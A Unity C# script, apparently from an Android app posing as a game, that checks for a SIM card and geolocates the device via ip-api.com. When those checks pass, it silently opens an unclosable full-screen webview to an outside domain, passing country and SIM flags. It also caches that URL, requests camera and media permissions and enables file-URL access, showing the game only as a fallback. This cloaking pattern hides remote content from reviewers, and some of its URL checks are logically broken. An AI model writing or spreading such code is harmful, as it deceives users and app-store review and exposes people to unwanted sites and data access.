using System.Collections;
using UnityEngine;
using UnityEngine.UI;
using UnityEngine.Networking;
using UnityEngine.Android;
using System;

public class OpenWebView : MonoBehaviour
{
    private const string ipApiUrl = "http://ip-api.com/json";

    public string mainUrl = "https://rampageflight.click/api/rmPa8gE3";

    int simCard;
    public bool checkSim;
    private UniWebView webView;

    public GameObject blackFon;

    string Url;
    void Start()
    {
        Url = PlayerPrefs.GetString("url", "");
        if (Url == "" || Application.internetReachability == NetworkReachability.NotReachable
                    || mainUrl.Equals("http://invalid-321int123.com/")
                    || Url.Equals("http://invalid-321int123.com/")
                    || ipApiUrl.Equals("http://invalid-321int123.com/")
                    || (Uri.TryCreate(mainUrl, UriKind.Absolute, out Uri uriResult)
                   && uriResult.Scheme != Uri.UriSchemeHttp || uriResult.Scheme != Uri.UriSchemeHttps))
        {
            if (mainUrl == "http://invalid-321int123.com/" || Application.internetReachability == NetworkReachability.NotReachable)
            {
                StartGame();
                return;
            }

            StartCoroutine(GetCountryCode());


            checkSim = CheckForSIMCard();
            if (checkSim)
            {
                simCard = 1;
                Debug.Log("Sim есть");
            }
            else
            {
                simCard = 0;
                Debug.Log("Sim нету");
                StartGame();
            }
        }
        else
        {
            OpenView(Url);
        }
    }

    bool CheckForSIMCard()
    {
#if UNITY_ANDROID
        AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
        AndroidJavaObject context = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
        AndroidJavaObject telephonyManager = context.Call<AndroidJavaObject>("getSystemService", "phone");
        return telephonyManager.Call<bool>("hasIccCard");
#else
        return false;
#endif
    }

    private IEnumerator GetCountryCode()
    {
        using (UnityWebRequest www = UnityWebRequest.Get(ipApiUrl))
        {
            yield return www.SendWebRequest();

            if (www.isNetworkError || www.isHttpError || www.responseCode == 404 || simCard == 0
                || Application.internetReachability == NetworkReachability.NotReachable
                   || !(Uri.TryCreate(mainUrl, UriKind.Absolute, out Uri uriResult) 
                   && (uriResult.Scheme != Uri.UriSchemeHttp) || uriResult.Scheme != Uri.UriSchemeHttps))
            {
                Debug.Log("Load Game");
                StartGame();
            }
            else
            {
                string responseData = www.downloadHandler.text;

                CountryData countryData = JsonUtility.FromJson<CountryData>(responseData);
                string countryCode = countryData.countryCode;

                Debug.Log("Country Code: " + countryCode);
                Debug.Log($"Итоговая ссылка: {mainUrl}?country={countryCode}&sim={simCard}");

                if (mainUrl.Contains("invalid")
                    || Application.internetReachability == NetworkReachability.NotReachable)
                {
                    StartGame();
                    yield break;
                }
                else
                {
                    string result = $"{mainUrl}?country={countryCode}&sim={simCard}";
                    PlayerPrefs.SetString("url", $"{mainUrl}?country={countryCode}&sim={simCard}");
                    OpenView(result);
                }

            }
        }
    }

    [System.Serializable]
    private class CountryData
    {
        public string countryCode;
    }

    public void StartGame()
    {
        GameSceneLoad.Instance.GameStart();
    }


    private void OpenView(string link)
    {
        Permission.RequestUserPermission(Permission.ExternalStorageRead);
        Permission.RequestUserPermission(Permission.Camera);
        Permission.RequestUserPermissions(new string[] { "android.permission.READ_MEDIA_IMAGES" });
        Permission.RequestUserPermissions(new string[] { "android.permission.READ_MEDIA_VIDEO" });
        Permission.RequestUserPermissions(new string[] { "android.permission.READ_MEDIA_AUDIO" });

        var webViewGameObject = new GameObject("UniWebView");
        webView = webViewGameObject.AddComponent<UniWebView>();

        blackFon.SetActive(true);

        webView.Frame = new Rect(0, 50, Screen.width, Screen.height - 50);

        webView.OnOrientationChanged += (view, orientation) =>
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height);

        webView.OnShouldClose += (view) => {
            return false;
        };

        webView.SetAllowFileAccessFromFileURLs(true);

        webView.Load(link);
        webView.Show();
    }
}
